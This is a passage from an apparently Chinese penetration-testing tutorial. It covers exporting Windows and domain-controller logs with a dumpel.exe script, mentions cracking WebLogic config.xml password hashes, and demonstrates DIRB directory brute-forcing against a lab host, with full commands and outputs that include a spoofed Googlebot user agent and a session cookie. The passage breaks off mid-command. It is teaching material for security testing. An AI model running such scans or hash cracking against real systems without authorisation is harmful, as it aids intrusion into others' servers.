<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>freebuf<span class="token punctuation">.</span>com<span class="token operator">/</span>articles<span class="token operator">/</span>web<span class="token operator">/</span><span class="token number">220147.</span>html  <span class="token operator">--</span>这篇集合了很多思路和方法

树上介绍了使用工具WebLogicPWV1<span class="token punctuation">.</span><span class="token number">0.</span>jar进行破解
</code></pre>
<p>这里如果进行config.xml获得hash破解密码，需要去两次密码…</p>
<hr>
<h2><a id="528__8801"></a>5.2.8 获取域控/系统日志</h2>
<h2><a id="dumpel_8803"></a>dumpel</h2>
<p>1、windows系统日志的存储：</p>
<p>windows的系统日志存储在C:\WINDOWS\system32\config目录，文件后缀为evt。</p>
<p>2、导出工具：</p>
<p>使用dumpel.exe可以导出windows的系统日志。</p>
<p>dumpel.exe可以去微软官网下载，地址：http://support.microsoft.com/kb/927229。</p>
<p>下载后的dumpel.exe是个安装文件，安装完后可以在安装目录找到一个dumpel.exe，我们需要的是安装后的dumpel.exe。</p>
<p>3、导出脚本：</p>
<p>直接使用dumpel.exe不容易实现自动定期导出系统日志。所以需要编写个脚本。脚本内容：</p>
<pre><code class="prism language-c"><span class="token comment">//获得YYYYMMDD格式的当前时间</span>
function <span class="token function">getCurYYYYMMDD</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	var today <span class="token operator">=</span> new <span class="token function">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	var year <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">getYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	var month <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">getMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>month <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		month <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token operator">+</span> month<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	var date <span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>date <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		date <span class="token operator">=</span> <span class="token string">"0"</span> <span class="token operator">+</span> date<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> year <span class="token operator">+</span> <span class="token string">""</span> <span class="token operator">+</span> month <span class="token operator">+</span> <span class="token string">""</span> <span class="token operator">+</span> date<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//补齐目录结尾的'\'</span>
function <span class="token function">makeDir</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'\\'</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">return</span> str <span class="token operator">+</span> <span class="token string">"\\"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">return</span> str<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
 
<span class="token comment">//处理命令行参数</span>
var args <span class="token operator">=</span> WScript<span class="token punctuation">.</span>Arguments<span class="token punctuation">;</span>
var days <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
var path <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
var exepath <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> args<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	var a <span class="token operator">=</span> <span class="token function">args</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"-e"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		exepath <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"-p"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		path <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"-d"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		days <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
 
<span class="token comment">//补齐目录结尾的'\'</span>
exepath <span class="token operator">=</span> <span class="token function">makeDir</span><span class="token punctuation">(</span>exepath<span class="token punctuation">)</span><span class="token punctuation">;</span>
path <span class="token operator">=</span> <span class="token function">makeDir</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token comment">//获取当前时间</span>
var YYYYMMDD <span class="token operator">=</span> <span class="token function">getCurYYYYMMDD</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
var YYYYMM <span class="token operator">=</span> YYYYMMDD<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token comment">//判断按月存放的目录是否存在</span>
var fso <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"Scripting.FileSystemObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>fso<span class="token punctuation">.</span><span class="token function">FolderExists</span><span class="token punctuation">(</span>path <span class="token operator">+</span> YYYYMM<span class="token punctuation">)</span> <span class="token operator">!=</span> true<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	fso<span class="token punctuation">.</span><span class="token function">CreateFolder</span><span class="token punctuation">(</span>path <span class="token operator">+</span> YYYYMM<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
 
<span class="token comment">//执行程序，导出日志</span>
var ws <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"WScript.shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ws<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>exepath <span class="token operator">+</span> <span class="token string">"dumpel.exe /l"</span> <span class="token operator">+</span> <span class="token string">" application"</span> <span class="token operator">+</span> <span class="token string">" /f "</span> <span class="token operator">+</span> path <span class="token operator">+</span> YYYYMM <span class="token operator">+</span> <span class="token string">"\\"</span> <span class="token operator">+</span> YYYYMMDD <span class="token operator">+</span> <span class="token string">"_app.xls /d "</span> <span class="token operator">+</span> days<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> true<span class="token punctuation">)</span><span class="token punctuation">;</span>
ws<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>exepath <span class="token operator">+</span> <span class="token string">"dumpel.exe /l"</span> <span class="token operator">+</span> <span class="token string">" security"</span> <span class="token operator">+</span> <span class="token string">" /f "</span> <span class="token operator">+</span> path <span class="token operator">+</span> YYYYMM <span class="token operator">+</span> <span class="token string">"\\"</span> <span class="token operator">+</span> YYYYMMDD <span class="token operator">+</span> <span class="token string">"_sec.xls /d "</span> <span class="token operator">+</span> days<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> true<span class="token punctuation">)</span><span class="token punctuation">;</span>
ws<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>exepath <span class="token operator">+</span> <span class="token string">"dumpel.exe /l"</span> <span class="token operator">+</span> <span class="token string">" system"</span> <span class="token operator">+</span> <span class="token string">" /f "</span> <span class="token operator">+</span> path <span class="token operator">+</span> YYYYMM <span class="token operator">+</span> <span class="token string">"\\"</span> <span class="token operator">+</span> YYYYMMDD <span class="token operator">+</span> <span class="token string">"_sys.xls /d "</span> <span class="token operator">+</span> days<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> true<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>4、执行命令：</p>
<p>cscript bak_win_log.js -eD:\Desktop -pD:\winlog -d7</p>
<p>使用windows的任务计划执行该命令就实现了定期导出。</p>
<p>*dumpel的安装目录里的dumpel_d.htm是使用说明</p>
<hr>
<h2><a id="wevtutil_8904"></a>wevtutil</h2>
<p>直接上看微软详情吧：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>zh<span class="token operator">-</span>cn<span class="token operator">/</span>windows<span class="token operator">-</span>server<span class="token operator">/</span>administration<span class="token operator">/</span>windows<span class="token operator">-</span>commands<span class="token operator">/</span>wevtutil
</code></pre>
<h2><a id="psloglist_8910"></a>psloglist</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token operator">-</span>zhong<span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">11743489.</span>html

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>wenku<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com<span class="token operator">/</span>view<span class="token operator">/</span>c2e9139803d8ce2f006623ff<span class="token punctuation">.</span>html<span class="token operator">?</span>from<span class="token operator">=</span>search   <span class="token operator">--</span>最详细的解释
</code></pre>
<h2><a id="53__8917"></a>5.3 网络信息收集</h2>
<h2><a id="531_WEB_8918"></a>5.3.1 发现目标WEB程序敏感目录</h2>
<p>DIRB官方地址： <code>http://dirb.sourceforge.net/</code></p>
<p>简介（摘自官方原文）：</p>
<p>DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analizing the response.</p>
<p>介绍：</p>
<p>DIRB是一个基于命令行的工具，依据字典来爆破目标Web路径以及敏感文件，它支持自定义UA，cookie，忽略指定响应吗，支持代理扫描，自定义毫秒延迟，证书加载扫描等。是一款非常优秀的全方位的目录扫描工具。同样Kaili内置了dirb</p>
<p>攻击机：<br>
192.168.1.104 Debian</p>
<p>靶机：<br>
192.168.1.102 Windows 2003 IIS<br>
<img src="https://img-blog.csdnimg.cn/20201001213927193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>普通爆破：</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>wordlist<span class="token operator">/</span>small# dirb http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span> <span class="token punctuation">.</span><span class="token operator">/</span>ASPX<span class="token punctuation">.</span>txt 

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
DIRB v2<span class="token punctuation">.</span><span class="token number">22</span>
By The Dark Raver
‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ 

START_TIME<span class="token punctuation">:</span> Sun Feb <span class="token number">17</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token punctuation">:</span><span class="token number">52</span> <span class="token number">2019</span>
URL_BASE<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>
WORDLIST_FILES<span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token operator">/</span>ASPX<span class="token punctuation">.</span>txt 

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ 

GENERATED WORDS<span class="token punctuation">:</span> <span class="token number">822</span> 

‐‐‐‐ Scanning URL<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span> ‐‐‐‐
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//Index.aspx (CODE:200|SIZE:2749)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//Manage/Default.aspx (CODE:302|SIZE:203) </span>

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
END_TIME<span class="token punctuation">:</span> Sun Feb <span class="token number">17</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token punctuation">:</span><span class="token number">56</span> <span class="token number">2019</span>
DOWNLOADED<span class="token punctuation">:</span> <span class="token number">822</span> ‐ FOUND<span class="token punctuation">:</span> <span class="token number">2</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201001214001772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>多字典挂载：</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>wordlist<span class="token operator">/</span>small# dirb http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span> <span class="token punctuation">.</span><span class="token operator">/</span>ASPX<span class="token punctuation">.</span>txt<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token operator">/</span>DIR<span class="token punctuation">.</span>txt

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
DIRB v2<span class="token punctuation">.</span><span class="token number">22</span>
By The Dark Raver
‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ 

START_TIME<span class="token punctuation">:</span> Sun Feb <span class="token number">17</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">02</span> <span class="token number">2019</span>
URL_BASE<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>
WORDLIST_FILES<span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token operator">/</span>ASPX<span class="token punctuation">.</span>txt<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token operator">/</span>DIR<span class="token punctuation">.</span>txt 

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ 

GENERATED WORDS<span class="token punctuation">:</span> <span class="token number">1975</span> 

‐‐‐‐ Scanning URL<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span> ‐‐‐‐
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//Index.aspx (CODE:200|SIZE:2749)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//Manage/Default.aspx (CODE:302|SIZE:203)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//bbs (CODE:301|SIZE:148)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//manage (CODE:301|SIZE:151)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//manage/ (CODE:302|SIZE:203)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//kindeditor/ (CODE:403|SIZE:218)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//robots.txt (CODE:200|SIZE:214)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//Web.config (CODE:302|SIZE:130)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//files (CODE:301|SIZE:150)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//install (CODE:301|SIZE:152) </span>

<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> FATAL<span class="token punctuation">:</span> Too many errors connecting to host
<span class="token punctuation">(</span>Possible cause<span class="token punctuation">:</span> EMPTY REPLY FROM SERVER<span class="token punctuation">)</span> 

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
END_TIME<span class="token punctuation">:</span> Sun Feb <span class="token number">17</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">06</span> <span class="token number">2019</span>
DOWNLOADED<span class="token punctuation">:</span> <span class="token number">1495</span> ‐ FOUND<span class="token punctuation">:</span> <span class="token number">10</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201001214026682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>自定义UA：</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>wordlist<span class="token operator">/</span>small# dirb http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span> <span class="token punctuation">.</span><span class="token operator">/</span>ASPX<span class="token punctuation">.</span>txt ‐a "M
ozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> Googlebot<span class="token operator">/</span><span class="token number">2.1</span><span class="token punctuation">;</span> <span class="token operator">+</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>google<span class="token punctuation">.</span>com<span class="token operator">/</span>bot<span class="token punctuation">.</span>html<span class="token punctuation">)</span>"

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
DIRB v2<span class="token punctuation">.</span><span class="token number">22</span>
By The Dark Raver
‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ 

START_TIME<span class="token punctuation">:</span> Sun Feb <span class="token number">17</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token number">51</span> <span class="token number">2019</span>
URL_BASE<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>
WORDLIST_FILES<span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token operator">/</span>ASPX<span class="token punctuation">.</span>txt
USER_AGENT<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> Googlebot<span class="token operator">/</span><span class="token number">2.1</span><span class="token punctuation">;</span> <span class="token operator">+</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>google<span class="token punctuation">.</span>com<span class="token operator">/</span>bot<span class="token punctuation">.</span>html<span class="token punctuation">)</span>

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ 

GENERATED WORDS<span class="token punctuation">:</span> <span class="token number">822</span>

‐‐‐‐ Scanning URL<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span> ‐‐‐‐
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//Index.aspx (CODE:200|SIZE:2735)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token comment">//Manage/Default.aspx (CODE:302|SIZE:203) </span>

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
END_TIME<span class="token punctuation">:</span> Sun Feb <span class="token number">17</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token number">54</span> <span class="token number">2019</span>
DOWNLOADED<span class="token punctuation">:</span> <span class="token number">822</span> ‐ FOUND<span class="token punctuation">:</span> <span class="token number">2</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201001214052754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>自定义cookie：</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>wordlist<span class="token operator">/</span>small# dirb http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage <span class="token punctuation">.</span><span class="token operator">/</span>DIR<span class="token punctuation">.</span>txt
‐a "Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> Googlebot<span class="token operator">/</span><span class="token number">2.1</span><span class="token punctuation">;</span> <span class="token operator">+</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>google<span class="token punctuation">.</span>com<span class="token operator">/</span>bot<span class="token punctuation">.</span>ht
ml<span class="token punctuation">)</span><span class="token string">" ‐c "</span>ASP<span class="token punctuation">.</span>NET_SessionId<span class="token operator">=</span>jennqviqmc2vws55o4ggwu45"

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
DIRB v2<span class="token punctuation">.</span><span class="token number">22</span>
By The Dark Raver
‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ 

START_TIME<span class="token punctuation">:</span> Sun Feb <span class="token number">17</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">08</span> <span class="token number">2019</span>
URL_BASE<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token operator">/</span>
WORDLIST_FILES<span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token operator">/</span>DIR<span class="token punctuation">.</span>txt
USER_AGENT<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> Googlebot<span class="token operator">/</span><span class="token number">2.1</span><span class="token punctuation">;</span> <span class="token operator">+</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>googl
e<span class="token punctuation">.</span>com<span class="token operator">/</span>bot<span class="token punctuation">.</span>html<span class="token punctuation">)</span>
COOKIE<span class="token punctuation">:</span> ASP<span class="token punctuation">.</span>NET_SessionId<span class="token operator">=</span>jennqviqmc2vws55o4ggwu45 

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ 

GENERATED WORDS<span class="token punctuation">:</span> <span class="token number">1153</span> 

‐‐‐‐ Scanning URL<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token operator">/</span> ‐‐‐‐
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token comment">//include/ (CODE:403|SIZE:218)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token comment">//news/ (CODE:403|SIZE:218)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token comment">//include (CODE:301|SIZE:159)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token comment">//images/ (CODE:403|SIZE:218)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token comment">//sys/ (CODE:403|SIZE:218)</span>
<span class="token operator">+</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage<span class="token comment">//images (CODE:301|SIZE:158) </span>

<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">)</span> FATAL<span class="token punctuation">:</span> Too many errors connecting to host
<span class="token punctuation">(</span>Possible cause<span class="token punctuation">:</span> EMPTY REPLY FROM SERVER<span class="token punctuation">)</span> 

‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
END_TIME<span class="token punctuation">:</span> Sun Feb <span class="token number">17</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">10</span> <span class="token number">2019</span>
DOWNLOADED<span class="token punctuation">:</span> <span class="token number">673</span> ‐ FOUND<span class="token punctuation">:</span> <span class="token number">6</span>

</code></pre>
<p><strong>自定义毫秒延迟：</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>wordlist<span class="token operator">/</span>small# dirb http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.102</span><span class="token operator">/</span>Manage <span class="token punctuation">.</span><span class="token operator">/</span>DIR<span class="token punctuation">.</span>txt
